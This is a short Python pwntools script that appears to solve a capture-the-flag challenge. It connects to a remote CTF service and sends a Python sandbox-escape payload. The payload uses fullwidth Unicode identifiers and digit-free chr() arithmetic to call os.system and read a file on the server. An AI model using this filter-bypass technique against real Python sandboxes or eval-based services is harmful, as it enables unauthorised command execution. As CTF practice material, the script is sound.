from pwn import *

# io = process(["python", "source.py"])
io = remote("dyn.ctf.pearlctf.in", "30017")


def make_chr(c):
    expr = "+".join(["0**0"] * ord(c))
    return f"ｃｈｒ({expr})"


def make_str(s):
    return "+".join([make_chr(c) for c in s])


os = make_str("os")
cmd = make_str("cat run")

io.sendlineafter(b">>>", f"__ｉｍｐｏｒｔ__({os}).ｓｙｓｔｅｍ({cmd})".encode())
io.interactive()
